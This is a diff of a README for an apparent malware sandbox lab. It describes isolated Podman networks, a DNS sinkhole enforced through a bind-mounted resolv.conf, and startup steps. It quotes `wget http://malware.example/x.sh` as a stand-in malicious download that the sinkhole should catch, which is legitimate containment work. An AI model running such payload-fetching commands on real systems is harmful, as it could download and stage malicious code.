@@ -25,11 +25,11 @@ cs-deception 10.200.2.0/24   internal  ssh, http
 cs-egress    10.200.3.0/24   internal  sinkhole 10.200.3.2, sandbox 10.200.3.10
 ```
 
-The sandbox is attached **only** to `cs-egress`. Its resolver is the sinkhole. Stage 0 means a lookup for `malware.example` returns `10.200.3.2` and `wget http://malware.example/x.sh` appears to succeed without leaving the lab.
+The sandbox is attached **only** to `cs-egress`. Podman would otherwise point DNS at the bridge (`.1`), so `config/resolv.sandbox` is bind-mounted as `/etc/resolv.conf` and forces `10.200.3.2`. Stage 0 means a lookup for `malware.example` returns `10.200.3.2` and `wget http://malware.example/x.sh` appears to succeed without leaving the lab.
 
 ## Start
 
-Needs Podman 5+ with Compose (this Fedora box already has it).
+Needs Podman 5+ with Compose. `make up` starts the user API socket first (`systemctl --user start podman.socket`).
 
 ```bash
 make up
